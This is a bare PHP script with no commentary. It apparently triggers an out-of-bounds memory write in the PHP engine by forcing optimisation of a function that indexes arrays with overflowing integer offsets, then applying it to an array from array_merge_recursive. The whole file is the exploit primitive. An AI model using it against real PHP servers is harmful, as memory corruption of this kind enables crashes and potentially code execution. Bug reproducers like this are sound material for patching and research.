<?php

function corrupt(&$array, $offset, $oob_byte) {
    $base = (-0x7FFFFFC1) + $offset;
    $array[$base - (-0x80000000)] = 0x4B;
    $array[$base + 0x7FFFFFE1] = 0x4B;
    $array[$base + 0x7FFFFFC1] = $oob_byte;
}

function trigger_optimize() {
    $array = array_fill(0, 0x40, 0);
    for ($i = 0; $i < 1000000; $i++) {
        corrupt($array, 0, 0x00);
    }
}

trigger_optimize();

function test() {
    $array = array();
    $object = (object) array();
    $merged_array = array_merge_recursive($array, (array)$object);
    corrupt($merged_array, -2, 0x80);
}

test();

?>
